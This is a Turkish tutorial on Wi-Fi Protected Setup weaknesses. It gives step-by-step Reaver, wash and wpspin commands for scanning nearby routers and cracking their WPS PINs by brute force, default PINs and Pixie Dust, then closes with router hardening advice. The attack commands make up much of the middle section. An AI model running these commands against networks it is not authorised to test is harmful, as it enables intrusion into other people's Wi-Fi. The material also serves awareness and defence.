
## 📌 WPS (Wi-Fi Protected Setup) Nedir?

WPS (Wi-Fi Protected Setup), kablosuz ağlara kolayca bağlanmak için geliştirilmiş bir güvenlik protokolüdür. PIN veya WPS düğmesi kullanarak, karmaşık parolalar girmeye gerek kalmadan Wi-Fi ağına hızlı bir şekilde bağlanmayı sağlar.

### WPS Nasıl Çalışır?

WPS bağlantısı genellikle iki farklı yöntemle yapılır:
- 1️⃣ WPS Düğmesi ile Bağlantı
Modemin üzerindeki WPS düğmesine basılır.
Cihazın WPS seçeneği etkinleştirilir.
Cihaz, Wi-Fi ağına otomatik olarak bağlanır.
- 2️⃣ PIN Kodu ile Bağlantı
Modemin fabrika çıkışlı 8 haneli WPS PIN kodu kullanılır.
Cihaz, bu PIN’i girerek ağa bağlanır.

### WPS'nin Güvenlik Zafiyetleri

WPS, ciddi güvenlik açıklarına sahip olduğu için saldırılara açıktır.
🔴 Brute Force Saldırılarına Açık: 8 haneli PIN, genellikle maksimum birkaç saat içinde kırılabilir.
🔴 Reaver & Bully ile Kırılabilir: WPS PIN kodu, Reaver ve Bully gibi araçlarla saldırıya uğrayabilir.
🔴 Pixie Dust Saldırısı: Bazı modemlerde PIN hatalı hesaplandığı için saniyeler içinde kırılabilir.

### WPS'yi Kapatmak Gerekir mi?

**✅ Evet, WPS'yi devre dışı bırakmak güvenliği artırır.**

**✅ Modem arayüzünden WPS'yi kapatarak güvenlik açığını önleyebilirsin.**

**✅ Güçlü WPA2/WPA3 şifreleme ve uzun, karmaşık parolalar kullanmak güvenliği artırır.**

________________________________________________________________________________________________________________________________________________________________________________

## 📌 Reaver Nedir?

Reaver, WPS açıklarını sömürerek Wi-Fi şifrelerini kırmak için kullanılan bir araçtır. WPS PIN saldırısı yaparak hedef modemden WPA/WPA2 şifresini elde etmeye çalışır.

## 📌 Reaver Kullanımı

- 1️⃣ Reaver Kurulumu
Kali Linux veya diğer Linux dağıtımlarında aşağıdaki komutlarla yüklenebilir:
```bash
sudo apt update && sudo apt install reaver -y
```

## 📌 Reaver Temel Komutları

- 1️⃣ Monitor Modunu Açma
Öncelikle, kablosuz ağ adaptörünü monitor moda geçirmelisin:
```bash
airmon-ng start wlan0
```
wlan0 yerine kendi adaptör ismini yazmalısın.
- 2️⃣ Yakındaki Ağları Tarama
Hangi modemlerin WPS özelliğinin açık olduğunu görmek için:
```bash
wash -i wlan0mon
```
Bu komut, WPS açık olan modemleri listeler.
- 3️⃣ Reaver ile WPS PIN Saldırısı Başlatma
Belirlediğin WPS açık modeme saldırı yapmak için:
```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv
```

## 📌 Açıklamalar:

-i wlan0mon → Kablosuz adaptörün monitor moddaki ismi.
-b XX:XX:XX:XX:XX:XX → Hedef modem MAC adresi.
-vv → Detaylı çıktı verir.
```bash
MAC adresini wash -i wlan0mon komutundan öğrenebilirsin.
```
- 4️⃣ PIN ile Doğrudan Şifre Kırma
Bazı modemlerin varsayılan PIN kodları olabilir. Bunları deneyerek WPA/WPA2 şifresini almak için:
```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -p 12345670 -vv
```
Burada -p 12345670, PIN kodudur. Varsayılan WPS PIN’leriyle deneme yapar.
- 5️⃣ Pixie Dust Saldırısı (Hızlı PIN Kırma)
Eğer modem Pixie Dust saldırısına karşı savunmasızsa, PIN saniyeler içinde kırılabilir.
```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -K 1 -vv
```

### Ekstra Seçenekler:

-K 1 → Pixie Dust saldırısını aktif eder.

## 📌 Reaver İşlem Süresi & Önlemler

**⏳ Süre: WPS brute-force saldırısı birkaç saat sürebilir.**

**🛑 Korunma: Reaver saldırılarından korunmak için WPS’yi kapat ve güçlü bir WPA2/WPA3 şifresi kullan.**

_______________________________________________________________________________________-

### Reaver ile Hazır PIN'ler Nasıl Bulunur?

Bazı modemlerin varsayılan WPS PIN kodları üreticiler tarafından belirlenmiştir. Reaver, bu varsayılan PIN’leri kullanarak WPA/WPA2 şifresini hızlıca kırabilir.
**🔹 1️⃣ WPS Açık Modemleri Tarama**

Öncelikle, WPS açık olan modemleri bulmak için aşağıdaki komutu kullan:
```bash
wash -i wlan0mon --ignore-fcs
```

### Bu komut:

WPS açık olan modemleri gösterir.
MAC adreslerini listeler.
**🔹 2️⃣ Varsayılan WPS PIN'leri ile Deneme**

Bulduğun modem için varsayılan WPS PIN’lerini Reaver kullanarak deneyebilirsin:
```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -p 12345670 -vv
```

## 📌 Açıklamalar:

-b XX:XX:XX:XX:XX:XX → Modemin MAC adresini gir.
-p 12345670 → Bilinen varsayılan WPS PIN’iyle giriş yapmayı dener.
-vv → Detaylı çıktı almak için kullanılır.
**💡 Varsayılan PIN’leri öğrenmek için bazı kaynaklar:**

**🔹 3️⃣ Bulunan PIN'leri Kullanarak WPA/WPA2 Şifresini Kırma**

Eğer modem bilinen varsayılan bir WPS PIN kullanıyorsa, bu PIN’i aşağıdaki gibi kullanarak WPA/WPA2 şifresini öğrenebilirsin:
```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -p 12345670 -vv
```

### Eğer modem Pixie Dust açığına sahipse, saldırıyı hızlandırabilirsin:

```bash
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -K 1 -vv
```
-K 1 → Pixie Dust saldırısını başlatır (bazı modemlerde saniyeler içinde şifreyi çözer).
**🔹 4️⃣ Router Modeline Göre PIN Bulma**

Bazı modemler, belirli bir algoritmaya göre PIN oluşturur. WPS PIN hesaplayıcıları kullanarak uygun PIN’i bulabilirsin:
```bash
wpspin XX:XX:XX:XX:XX:XX
```

### Bu komut, modem MAC adresine göre tahmini WPS PIN kodları üretir.


## 📌 Modem Güvenliği Nasıl Sağlanır?

Modemler, saldırganlar için en önemli hedeflerden biridir. Güvenliğini artırmak için aşağıdaki önlemleri almalısın:
**🔹 1️⃣ Modem Arayüzü İçin Güçlü Bir Şifre Kullan**


### Modem arayüzüne giriş yapan biri, tüm ayarlarını değiştirebilir!

Fabrika çıkışlı kullanıcı adı ve şifreleri değiştir (Genellikle "admin/admin" veya "admin/1234" gibi zayıf şifreler olur).
Güçlü bir yönetici şifresi belirle (Örn: T1mE!@#SeCuRe890)
Farklı bir kullanıcı adı ayarla, böylece saldırganların tahmin etmesi zorlaşır.
**🔹 2️⃣ WPA3 veya WPA2-PSK Şifreleme Kullan**


### Ağını korumak için en güvenli şifreleme protokolünü kullanmalısın.

En iyi seçenek: WPA3-Personal (Yeni nesil modemlerde desteklenir).
Alternatif: WPA2-PSK (AES) kullan.
Asla WEP veya WPA1 kullanma, çünkü kırılmaları çok kolaydır.

### Wi-Fi şifreni güçlü yap:

**✔ En az 12 karakter uzunlukta olsun.**

**✔ Büyük-küçük harf, rakam ve özel karakter içersin (Örn: H@ckM3_1fY0uC@N!).**

**🔹 3️⃣ WPS (Wi-Fi Protected Setup) Kapat**


### WPS, modemin en büyük güvenlik açıklarından biridir!

Pixie Dust saldırıları ile kırılabilir.
Reaver gibi araçlarla WPS PIN’leri kolayca ele geçirilebilir.
Modem arayüzüne girerek WPS’yi tamamen kapat!
**🔹 4️⃣ Modem Arayüzünü Uzak Erişime Kapat**


### Modem arayüzünün dışarıdan erişilmesini engelle!

"Remote Management" veya "Uzak Yönetim" ayarını kapat.
Eğer açman gerekiyorsa, yalnızca belirli IP adreslerine izin ver.
**🔹 5️⃣ Firmware Güncellemelerini Yap**


### Eski modem yazılımlarında kritik güvenlik açıkları olabilir.

Modem arayüzünden "Firmware Güncelleme" bölümüne girerek en son güncellemeleri yükle.
Üretici sitelerinden güncellemeleri kontrol et.
**🔹 6️⃣ MAC Adresi Filtreleme Kullan**


### Ağında sadece izin verdiğin cihazların bağlanmasını istiyorsan:

Modem arayüzüne gir, MAC Filtreleme'yi aktif et ve sadece güvenilir cihazlarının MAC adreslerini ekle.
**🔹 7️⃣ Kullanılmayan Servisleri Kapat**


### Saldırı yüzeyini azaltmak için gereksiz servisleri kapat.

Telnet & SSH erişimini kapat.
UPnP’yi (Universal Plug and Play) devre dışı bırak. (Saldırganlar UPnP üzerinden zararlı portları açabilir!)
Modem arayüzünde "DMZ" özelliğini kapat!
**🔹 8️⃣ Wi-Fi Ağını Gizle (SSID Broadcast Kapat)**


### Modemin Wi-Fi ağ adını (SSID) gizleyerek, dışarıdan kolayca görünmesini engelleyebilirsin.

Gizli SSID kullan (SSID Broadcast’ı kapat).
Ancak bu tek başına güvenlik sağlamaz, sadece ekstra bir gizlilik katmanı ekler.
**🔹 9️⃣ Ağa Bağlanan Cihazları Düzenli Olarak Kontrol Et**


### Ağına bağlanan cihazları sürekli kontrol et.

Modem arayüzünden veya Fing gibi uygulamalarla bağlı cihazları görebilirsin.
Tanımadığın bir cihaz varsa şifreni değiştir ve MAC filtreleme yap.
**🔹 🔟 Modem Günlüklerini (Logs) İncele**


### Şüpheli girişleri ve bağlantıları takip et.

Modem arayüzünde "Logs" veya "Günlükler" sekmesine girerek dış IP bağlantıları ve giriş denemelerini incele.
Şüpheli aktiviteler varsa, modem şifreni ve Wi-Fi şifreni değiştir.